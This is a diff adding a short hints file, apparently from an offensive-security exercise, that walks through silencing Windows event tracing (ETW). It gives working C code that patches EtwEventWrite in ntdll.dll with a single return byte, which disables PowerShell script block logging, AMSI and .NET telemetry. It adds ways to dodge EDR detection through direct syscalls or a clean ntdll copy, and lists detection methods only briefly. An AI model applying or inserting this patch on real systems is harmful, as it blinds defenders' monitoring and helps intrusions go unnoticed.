@@ -1,0 +1,19 @@
+=== HINT 1: Get EtwEventWrite ===
+BYTE *fn = (BYTE*)GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
+
+=== HINT 2: Unlock and patch (single ret byte) ===
+DWORD old = 0;
+VirtualProtect(fn, 1, PAGE_EXECUTE_READWRITE, &old);
+*fn = 0xC3;
+VirtualProtect(fn, 1, old, &old);
+
+=== KEY INSIGHT ===
+EtwEventWrite patch silences ALL user-mode ETW events from this process:
+  PowerShell Script Block Logging, .NET CLR events, AMSI events, custom ETW providers.
+Kernel ETW (via kernel-mode providers) is unaffected - cannot be patched from user mode.
+Detection: CRC checks on ntdll.dll functions; integrity monitoring; Kernel Patch Guard (KPP).
+More surgical: patch only specific providers
+  (EtwEventEnabled, EtwEventRegister) to target PowerShell telemetry specifically.
+Alternative: GUID-based provider disable via EnableTraceEx2 if you control the process.
+Modern EDR hooks EtwEventWrite itself to detect patching - use direct syscall or
+  map a clean ntdll (md13 technique) to get an unhooked copy to call.
